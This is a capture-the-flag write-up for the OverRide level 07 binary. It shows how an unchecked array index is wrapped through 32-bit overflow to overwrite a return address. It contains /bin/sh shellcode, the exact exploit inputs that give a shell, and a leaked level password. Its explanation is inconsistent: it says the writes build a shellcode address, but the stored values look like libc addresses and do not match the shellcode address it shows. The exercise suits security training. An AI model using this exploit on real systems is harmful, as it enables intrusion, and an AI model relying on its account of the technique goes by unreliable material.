# Level 07 - Integer Overflow to Arbitrary Write

## Overview
A number storage service with flawed bounds checking allows arbitrary memory write via integer overflow, enabling return address overwrite.

---

## The Vulnerability

```c
int buffer[100];

int store_number(int *buffer) {
    int number = get_unum();
    int index = get_unum();
    
    if ((index % 3 != 0) && ((number >> 24) != 0xb7)) 
    {
        buffer[index] = number;  //  No bounds check!
        return 0;
    }
    // ...
}
```

**The Bug:** Checks `index % 3 != 0` but not if index is out of bounds!

**The Exploit:** Use large positive indices that wrap around to access return address location.

---

## Integer Overflow Bypass

### The Math

```
Return address is at buffer[114] (approximately)
But 114 % 3 = 0 (blocked!)

Solution: Add 2^30
114 + 1073741824 = 1073741938
1073741938 % 3 = 1  (passes check!)

When used as memory offset:
1073741938 * 4 bytes = 4294967752 bytes
Wraps in 32-bit: Points to same location as buffer[114]
```

### Bypass Checks

1. **Modulo check:** `(index % 3 != 0)` → Use 1073741938 instead of 114
2. **High byte check:** `(number >> 24) != 0xb7` → Shellcode address must not start with 0xb7

---

## Solution

```bash
# 1. Store shellcode in environment
level07@OverRide:~$ export SHELLCODE=$(python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

# 2. Find shellcode address (optional - values below work)
level07@OverRide:~$ /tmp/getenv SHELLCODE
0xffffd6f4

# 3. Run exploit with three stores
level07@OverRide:~$ ./level07
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully

Input command: store
 Number: 3735928559
 Index: 1073741939
 Completed store command successfully

Input command: store
 Number: 4160264172
 Index: 2147483764
 Completed store command successfully

Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

**Password:** `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`

---

## How It Works

```

Buffer at:        0xbffff100
Return address:   0xbffff2c8
Distance: 0x2c8 - 0x100 = 456 bytes
456 bytes ÷ 4 = 114 integers ✓


If it was at 452 bytes → index 113
If it was at 460 bytes → index 115

**It's 114 because that's where the return address ACTUALLY is in this binary!**

## 🔢 Why 2^30?

### The Math

For wraparound to work:

Index * 4 bytes ≥ 2^32 bytes (32-bit max)
Index ≥ 2^32 / 4
Index ≥ 2^30 ✓

2^30 is the MINIMUM that wraps around!


STEP 1: Store commands write to overflowed indices
├─ Index 1073741938 → wraps to buffer[114] (return address)
├─ Index 1073741939 → wraps to buffer[115]
└─ Index 2147483764 → wraps to nearby location

STEP 2: Three writes construct shellcode address on stack

STEP 3: Program quits
├─ Function returns
├─ Reads corrupted return address
└─ Jumps to shellcode → shell access!
```

---

## Key Concepts

**Integer Overflow:** Large indices wrap around in memory addressing
```
1073741938 * 4 bytes = 4294967752
In 32-bit space: wraps to 456 bytes offset = index 114
```

**Arbitrary Write:** `buffer[huge_index] = value` writes outside bounds

**Bypass Strategy:** Use mathematical properties to access blocked indices with different modulo results

---

## Summary

**Vulnerability:** No bounds checking on array index, only modulo check.

**Exploit:** Integer overflow to access return address with indices that pass validation.

**Technique:** Write shellcode address in parts using three store commands.